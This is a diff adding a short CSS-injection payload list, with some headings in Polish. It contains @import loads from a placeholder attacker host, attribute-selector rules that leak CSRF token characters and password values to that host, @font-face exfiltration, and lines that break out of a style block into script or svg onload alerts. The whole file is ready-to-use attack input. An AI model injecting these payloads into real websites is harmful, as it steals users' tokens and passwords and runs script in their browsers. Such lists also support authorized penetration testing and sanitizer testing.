@@ -1,0 +1,20 @@
+# === @import (steal data via load order) ===
+</style><style>@import url("https://{{ATTACKER}}/x.css");</style>
+@import"//{{ATTACKER}}/x.css";
+
+# === Attribute selector — exfil character-by-character ===
+input[name="csrf"][value^="a"]{background:url(//{{ATTACKER}}/?a)}
+input[name="csrf"][value^="b"]{background:url(//{{ATTACKER}}/?b)}
+
+# === Font-face exfiltration ===
+@font-face{font-family:x;src:url(//{{ATTACKER}}/?leak)}body{font-family:x}
+
+# === Style breakout ===
+</style><script>alert(1)</script>
+*/}</style><svg onload=alert(1)>
+
+# === HTML injection wewnątrz <style> ===
+expression(alert(1))
+
+# === Keylogger via attribute selector na input ===
+input[type=password][value$="a"]~*{background:url(//{{ATTACKER}}/?a)}
